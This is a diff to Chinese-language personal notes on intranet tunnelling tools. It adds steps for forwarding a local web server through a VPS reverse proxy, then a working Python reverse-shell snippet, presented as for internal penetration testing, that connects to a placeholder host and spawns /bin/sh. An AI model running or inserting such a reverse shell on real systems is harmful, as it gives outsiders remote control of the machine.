@@ -15,6 +15,23 @@ private:
 - lanproxy: 支持tcp流量转发
 - natapp: 基于ngrok, 比花生壳好用
 
+# ngrok
+参考：https://zhuanlan.zhihu.com/p/28820926 /py-demo/socket/proxy-reverse-server.py
+1. 假设我们需要共享的 web 是 python 的 simple http_server， 首先执行 python -m SimpleHTTPServer, 这样本地会绑定 8000 端口
+2. 在自己的 vps 上运行 python3 reverse_server.py
+3. 在本地运行 python3 reverse_client_proxy.py
+3. 接下来我们直接在外网访问 vps 的地址: http://xx.xx.xx.xx:8000 就可以发现能够转发内网的数据了
+
+内网穿透可以用于做内网渗透测试， 内网执行最基本的 python 反弹 shell 脚本：
+
+    import socket,subprocess,os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("x.x.x.x",2333))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"]);
+
 # 工具
 作者：予墨白 链接：https://www.zhihu.com/question/49629610/answer/190228044
 
